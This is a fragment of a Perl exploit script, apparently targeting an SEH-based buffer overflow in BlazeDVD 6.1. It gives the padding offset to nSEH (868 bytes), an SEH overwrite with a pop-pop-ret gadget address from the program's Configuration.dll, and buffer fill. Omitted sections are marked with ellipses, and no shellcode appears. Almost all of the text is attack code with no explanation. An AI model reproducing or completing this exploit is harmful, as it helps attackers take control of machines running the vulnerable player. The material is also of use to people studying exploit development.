...
my $junk = "\x41" x 868; # nseh is at offset 868, followed by 2864 bytes 
of available data
...
my $seh = pack('V',0x6033aa41); # overwrite seh w/ pop ecx pop ecx ret
                ...
                # \Program Files\BlazeVideo\BlazeDVD 
6.1\Configuration.dll
...
my $fill = "\x43" x ($buffsize - (length($sploit))); # create buffer 
fill
